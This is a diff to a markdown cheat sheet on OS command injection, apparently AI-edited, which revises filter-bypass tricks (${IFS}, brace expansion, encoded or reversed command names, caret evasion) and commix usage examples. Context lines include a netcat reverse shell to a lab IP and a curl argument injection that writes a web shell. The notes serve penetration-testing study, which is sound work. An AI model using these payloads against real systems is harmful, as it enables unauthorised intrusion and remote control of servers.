@@ -4,7 +4,7 @@
 
 ## What is this?
 
-User-controlled input is passed unsanitized to a system shell call. The injected operator appends or chains commands to the intended one. Vulnerable functions by language:
+User-controlled input is passed unsanitized to a system shell call. The injected operator appends or chains commands to the intended one. Pairs with [[File Inclusion]], [[Server-Side Attacks]], [[Web Attacks]]. Vulnerable functions by language:
 
 | Language | Dangerous Functions |
 |---|---|
@@ -114,7 +114,7 @@ Filters may block specific operators, keywords (`cat`, `whoami`, `ls`), or chara
 | Trick | Result |
 |---|---|
 | `%09` | Tab — accepted where space is blocked |
-| `${IFS}` | Expands to space/tab — cannot use inside `$()` |
+| `${IFS}` | Internal Field Separator — expands to whitespace (works inside `$()` too) |
 | `{ls,-la}` | Brace expansion — comma becomes space |
 
 ```bash
@@ -238,11 +238,13 @@ echo -n 'whoami' | xxd -p                  # → 77686f616d69
 $(printf '\x77\x68\x6f\x61\x6d\x69')      # executes whoami
 ```
 
-**Subshell nesting** — useful when semicolons are filtered:
+**Subshell substitution** — the inner `$()` runs and its *output* becomes part of the command line (not a chaining trick — the outer shell tries to run the result):
 
 ```bash
-# Commands chain through subshells — innermost runs first
-$($(whoami))
+# $(command) is replaced by its output before execution — build commands dynamically,
+# e.g. run a command whose name is produced by another command:
+$(rev<<<'imaohw')        # → runs whoami
+$(base64 -d<<<bHM=)      # → runs ls
 ```
 
 ### Windows
@@ -327,24 +329,25 @@ nc.exe -e cmd.exe 10.10.14.5 4444
 ## Automated Testing — commix
 
 ```bash
-# Basic scan
-commix --url "http://target.com/ping.php?ip=INJECT_HERE"
+# Basic scan — commix auto-tests each parameter (mark a specific point with * )
+commix --url "http://target.com/ping.php?ip=127.0.0.1"
+commix --url "http://target.com/ping.php?ip=127.0.0.1*"   # force injection at *
 
 # POST request
-commix --url "http://target.com/ping.php" --data "ip=INJECT_HERE"
+commix --url "http://target.com/ping.php" --data "ip=127.0.0.1"
 
 # With cookie
-commix --url "http://target.com/ping.php?ip=INJECT_HERE" --cookie "PHPSESSID=abc123"
+commix --url "http://target.com/ping.php?ip=127.0.0.1" --cookie "PHPSESSID=abc123"
 
 # From Burp request file
 commix -r request.txt
 
-# Force technique
-commix --url "http://target.com/ping.php?ip=INJECT_HERE" --technique=time    # time-based
-commix --url "http://target.com/ping.php?ip=INJECT_HERE" --technique=file    # file-based OOB
+# Force technique — letters: c=classic e=eval t=time-based f=file-based
+commix --url "http://target.com/ping.php?ip=127.0.0.1" --technique=t    # time-based
+commix --url "http://target.com/ping.php?ip=127.0.0.1" --technique=f    # file-based OOB
 
-# OS shell
-commix --url "http://target.com/ping.php?ip=INJECT_HERE" --os-shell
+# Run a single command / drop to the interactive pseudo-shell (auto after detection)
+commix --url "http://target.com/ping.php?ip=127.0.0.1" --os-cmd="id"
 ```
 
 ---
@@ -574,12 +577,12 @@ $()
 | Caret bypass (Windows CMD) | `who^ami` |
 | Base64 exec (Windows PS) | `powershell -EncodedCommand <b64>` |
 | Argument injection | `curl <input> --output /webroot/shell.php` |
-| Automate | `commix --url "..." --os-shell` |
+| Automate | `commix --url "..." --os-cmd="id"` |
 | Linux obfuscate | `bashfuscator -c 'cmd'` |
 | Windows obfuscate | `Invoke-DOSfuscation` |
 
 ---
 
 *Created: 2026-03-02*
-*Updated: 2026-05-14*
+*Updated: 2026-07-21*
 *Model: claude-sonnet-4-6*
